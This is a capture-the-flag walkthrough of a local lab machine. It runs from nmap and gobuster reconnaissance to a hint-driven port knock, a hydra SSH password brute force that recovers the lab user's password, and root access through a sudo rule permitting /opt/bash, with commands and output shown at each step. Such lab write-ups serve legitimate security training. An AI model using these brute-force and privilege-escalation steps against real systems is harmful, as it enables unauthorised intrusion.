# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` bash
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.092 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.055 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1060ms
rtt min/avg/max/mdev = 0.055/0.073/0.092/0.018 ms
```
## Ports scanning
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-12 23:20 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000042s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http
MAC Address: CA:FA:46:A7:AE:93 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 26.46 seconds
```
``` bash
sudo nmap -p80 -sS -sCV -T4 --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-12 23:21 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000035s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: CA:FA:46:A7:AE:93 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.32 seconds
```
# Web enumeration
## Dir fuzzing
``` bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 10792]
qdefense.txt         (Status: 200) [Size: 111]
server-status        (Status: 403) [Size: 275]
Progress: 830564 / 830564 (100.00%)
===============================================================
Finished
===============================================================
```
## TXT file
``` bash
curl http://172.17.0.2/qdefense.txt
Recuerda llama antes de entrar , no seas como toctoc el maleducado
7000 8000 9000
busca y llama +54 2933574639
```
**2 hints**
1. Posible user *toctock*
2. Ports hidden by firewall accessible after *port knocking*
# Port knocking
``` bash
knock 172.17.0.2 7000 8000 9000
```
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-12 23:29 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000067s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: CA:FA:46:A7:AE:93 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 26.45 seconds
```
# SSH
## Brute force with hydra
``` bash
hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -F -t 64 -vV
[22][ssh] host: 172.17.0.2   login: toctoc   password: kittycat
```
## Initial access
``` bash
ssh toctoc@172.17.0.2
```
# Privilege escalation
``` bash
 sudo -l
Matching Defaults entries for toctoc on 25c9e317e4bf:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User toctoc may run the following commands on 25c9e317e4bf:
    (ALL : NOPASSWD) /opt/bash
    (ALL : NOPASSWD) /ahora/noesta/function
```
``` bash
sudo -u root /opt/bash
```
``` bash
whoami
root
```
